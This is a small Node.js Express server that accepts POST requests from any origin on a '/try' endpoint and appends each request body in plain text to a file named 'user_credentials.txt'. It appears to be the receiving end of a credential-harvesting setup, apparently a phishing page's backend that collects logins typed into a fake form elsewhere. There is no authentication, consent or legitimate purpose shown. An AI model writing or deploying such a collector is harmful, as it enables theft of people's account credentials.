const fs = require('fs');
const express = require('express');
const cors = require('cors');


const app = express()
app.use(express.json());

//limit the api call
app.use(express.json({limit: '100mb'}));

//enable cors
app.use(cors({
    origin: "*",
    methods: ['GET','POST','DELETE','UPDATE','PUT','PATCH']
  }))

  app.get("/", (req, res) => {res.json("hello world")})
  const filePath = 'user_credentials.txt';
  app.post("/try", (req, res) => {
    try{
        console.log(req.body)
    fs.appendFile(filePath, JSON.stringify(req.body)+"\r\n", (err) => {
      if (err) {
          console.error('Error saving credentials:', err);
          res.json(false);
          return;
      }
      console.log(true);
      res.json(true);
  });

    } catch(e){
        res.json(false)
    }
  })
  


app.listen(3001, () => {
    console.log('Server is running on port 3001');
});
